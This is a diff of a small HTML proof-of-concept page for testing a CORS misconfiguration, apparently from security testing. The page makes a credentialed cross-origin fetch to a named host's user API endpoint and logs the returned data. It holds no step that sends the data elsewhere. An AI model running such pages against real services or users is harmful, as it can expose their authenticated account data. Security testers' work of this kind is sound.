@@ -1,14 +1,21 @@
 <!DOCTYPE html>
 <html>
-  <body>
-    <script>
-      fetch('https://alerts.gitlab.net/api/v4/projects', {
-        method: 'GET',
-        credentials: 'include'
-      })
-      .then(response => console.log('Status:', response.status))
-      .catch(error => console.error(error));
-    </script>
-    <p>DevTools Console-এ দেখবে: request পাঠানো হয়েছে এবং response headers-এ CORS হেডার আসছে।</p>
-  </body>
+<head>
+  <title>CORS PoC</title>
+</head>
+<body>
+  <h2>Testing CORS...</h2>
+  <script>
+    fetch("https://alerts.gitlab.net/api/v4/user", {
+      credentials: "include"
+    })
+    .then(response => response.text())
+    .then(data => {
+      console.log("[+] Response from GitLab:", data);
+    })
+    .catch(error => {
+      console.log("[!] CORS blocked or error:", error);
+    });
+  </script>
+</body>
 </html>
